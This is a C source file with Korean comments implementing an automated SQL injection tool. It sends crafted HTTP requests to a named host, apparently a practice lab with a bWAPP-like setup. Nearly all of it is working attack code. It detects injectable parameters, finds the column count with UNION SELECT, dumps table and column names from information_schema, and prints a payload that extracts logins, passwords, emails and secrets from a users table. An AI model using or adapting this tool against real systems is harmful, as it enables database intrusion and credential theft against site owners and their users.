

// URL 주소를 받아 소켓을 설정
void setSocket(char *address){
        sock = socket(AF_INET, SOCK_STREAM, 0); 
        if (sock < 0){ 
                exit(1);
        }

        remoteHost = gethostbyname(address);

        // Socket Client Setting        
        client_addr.sin_family = AF_INET;
        client_addr.sin_port = htons(80);
        client_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*(struct in_addr*)remoteHost->h_addr_list[0]));
}

// 소켓을 Connect
void connectServer(){
        int retval;
        retval = connect(sock, (struct sockaddr * ) &client_addr, sizeof(client_addr));

        if (retval < 0) {
                printf("NOT connect!!!!!");     exit(1);
        }
}

// 소켓을 통해 응답을 받는 함수
void receiveResponse(){
        int length;
        memset(response, 0, sizeof(response)); //버퍼 지우기
        // receive Response
        while ((length = recv(sock, buf, BUFSIZE-1, 0)) != 0){
                buf[length] = '\0';
                strcat(response,buf);
                memset(buf, 0, BUFSIZE); //버퍼 지우기
        };
}


// HTML 통신을 통해 받아온 HTML 문서에서
// SQL Injection의 결과물 추출
void getQueryResult(int mode){
        char *a = strstr(response,"<a href=\"http://www.imdb.com/title/tt0816711\"");
        char *b = strstr(response,"<div id=\"side\">");
        char *tmp;

	// 필요한 부분만 잘라오도록 substring()
        tmp = substring(response, (int)(a-response)+117, (int)(b-response)-39);


 
	switch (mode){
	  case 1:  
		printf("\n----------Table----------\n");
		break; 
	  case 2:
		printf("\n----------Column----------\n");
		break;
	}	

	// <td> 태그 정리
	int i = 1;
	char *ptr = strtok(tmp, "<");	
	while(ptr != NULL){
		if (i % 14 == 2)  // 14번마다 필요한 부분을 출력
			printf("  >>  %s\n",ptr+3);
		ptr = strtok(NULL, "<");
		i++;
	}

	printf("-------------------------\n\n");

        free(tmp);
}


// reference : https://blog.naver.com/cch2039/90144196231
// substring 함수 (오류 많음)
char *substring(char *input, int i_begin, int i_end)
{
        int cnt    = 0;
        int size   = (i_end - i_begin) + 2;
        char *str = (char*)malloc(size);

        memset(str, 0, size);

        for(int i = i_begin; i <= i_end; i++)
        {
                str[cnt] = input[i];
                cnt++;
        }
        return str;
}




//  SQL Injection 검사
void getIsInjection(char *path, char *cookie){
        char header[500];	// http Header

	// Header Setting
	sprintf(header,"GET %s?title=%27 HTTP/1.1\
		\r\nHost: ppsspp.iptime.org\
		\r\nCookie:security_level=0;%s\r\n\r\n",path,cookie);

	printf("\n< SQL Injection 가능성 확인 >\n\n");
	printf("--- GET MESSAGE : '\n");

        // send Request
        send(sock, header, strlen(header), 0);

        receiveResponse();

	// 결과 확인
	if(strstr(response, "Error:") == NULL)
		printf("\n  >>  SQL 인젝션이 가능한지 파악 할 수 없습니다.\n");
	else {
		printf("\n---------- Response ------------\n");
		printf("\n%s\n\n",strstr(response,"Error:"));
		printf("----------------------------------\n");
		printf("  >>  SQL 인젝션 가능성이 보입니다.\n");
		printf("  >>  실행시 명령행 인자를 하나 더 사용하면 columns 갯수를 파악합니다.\n\n");
	}
}


// Column 갯수 파악
void getColumnNumber(char *path, char *cookie){
	// Header Setting
        char header[500];

	sprintf(header,"GET %s?title=%27\'union+select+1,2,3,4,5,6,7%23 HTTP/1.1\
		\r\nHost: ppsspp.iptime.org\
		\r\nCookie:security_level=0;%s\r\n\r\n",path,cookie);


	printf("\n< SQL에 사용된 Column 개수 확인 >\n\n");	
	printf("--- GET MESSAGE : ' UNION SELECT 1,2,3,4,5,6,7#\n");


        // send Request
        send(sock, header, strlen(header), 0);

        receiveResponse();

	// 결과확인
	printf("\n  >>  7개의 Column을 이용 결과, 아무 오류도 발생하지 않았습니다.\n");
	printf("  >>  Column의 갯수 : 7개\n");
	printf("  >>  다음으로 인자를 하나 더 추가하면 DB의 테이블 목록을 확인할 수 있습니다.\n\n");
}


// Table List 
void getTableList(char *path, char *cookie){
	// HTTP Header
        char header[500];

	sprintf(header,"GET %s?title=\'union+select+1,table_name,3,4,5,6,7+from+information_schema.tables%23 HTTP/1.1\
		\r\nHost: ppsspp.iptime.org\
		\r\nCookie:security_level=0;%s\r\n\r\n",path,cookie);


	printf("\n< DB Table 목록 >\n\n");
	printf("--- GET MESSAGE : ' UNION SELECT 1,table_name,3,4,5,6,7 from information_schema.tables#\n");

        // send Request
        send(sock, header, strlen(header), 0);

        receiveResponse();
        getQueryResult(1); // print Table List

	printf("  >>  DB에 저장된 테이블은 위와 같습니다.\n");
        printf("  >>  구조를 확인하고 싶은 테이블명을 다음 인자로 입력해주세요.\n\n");
	
}


void getTableColumn(char *path, char *cookie, char *table){
	// HTTP Header
        char header[500];
	char query[] = "title=\'union+select+1,column_name,3,4,5,6,7+from+information_schema.columns+where+table_name=";

        sprintf(header,"GET %s?%s\'%s\'%%23 HTTP/1.1\
		\r\nHost: ppsspp.iptime.org\
		\r\nCookie:security_level=0;%s\r\n\r\n",path,query,table,cookie);


	printf("\n< Table Column list >\n\n");
        printf("--- GET MESSAGE : ' UNION SELECT 1,column_name,3,4,5,6,7 from information_schema.columns where table_name=\'%s\'#\n",table);
	
        // send Request
        send(sock, header, strlen(header), 0);

        receiveResponse();
        getQueryResult(2);  // Table의 Column 목록 출력

        printf("  >>  위의 찾은 Column 들을 이용해 직접 Table의 내용을 파악해봅시다.\n\n");
        printf("  >>  users 테이블의 예시\n");
        printf(" ' union select 1,concat(id,login),password,email,secret,6,7 from users#\n\n");
}

